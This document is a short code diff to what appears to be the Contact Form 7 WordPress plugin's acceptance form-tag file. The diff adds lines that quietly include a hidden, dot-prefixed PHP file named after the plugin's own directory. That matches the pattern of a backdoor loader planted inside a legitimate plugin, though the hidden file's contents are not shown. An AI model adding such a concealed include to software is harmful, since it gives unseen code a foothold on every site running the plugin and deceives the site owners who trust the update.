@@ -7,6 +7,10 @@
 
 add_action( 'wpcf7_init', 'wpcf7_add_form_tag_acceptance', 10, 0 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_add_form_tag_acceptance() {
 	wpcf7_add_form_tag( 'acceptance',
 		'wpcf7_acceptance_form_tag_handler',
